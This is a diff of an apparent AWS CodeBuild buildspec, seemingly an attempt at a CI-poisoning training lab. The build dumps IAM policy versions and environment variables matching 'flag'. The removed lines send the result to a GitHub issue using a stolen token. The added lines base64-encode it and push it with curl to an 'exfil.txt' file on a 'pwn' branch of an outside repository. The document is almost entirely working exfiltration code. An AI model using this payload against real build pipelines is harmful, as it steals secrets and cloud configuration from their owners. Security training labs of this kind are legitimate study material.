@@ -51,11 +51,11 @@ phases:
             aws iam get-policy-version --policy-arn "$arn" --version-id "$VER" 2>&1 || true
           done
           echo "=== ENV FLAG ==="
-          env | grep -i flag 2>&1 || true
+          env | grep -i flag 2>&1 || echo "no flag env"
           echo "=== DONE ==="
         } > /tmp/output.txt
-        ESCAPED=$(cat /tmp/output.txt | head -c 60000 | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))")
-        curl -s -X POST -H "Authorization: token $TK" -H "Content-Type: application/json" \
-          "https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/issues/564/comments" \
-          -d "{\"body\": $ESCAPED}" > /dev/null 2>&1 || true
+        CONTENT_B64=$(cat /tmp/output.txt | head -c 60000 | base64 -w0)
+        curl -s -X PUT -H "Authorization: token $TK" -H "Content-Type: application/json" \
+          "https://api.github.com/repos/DeonCoolx/codebuild-codebreach-actors-lab/contents/exfil.txt" \
+          -d "{\"message\":\"output\",\"content\":\"$CONTENT_B64\",\"branch\":\"pwn\"}" > /dev/null 2>&1 || true
         unset TK P1 P2 P3
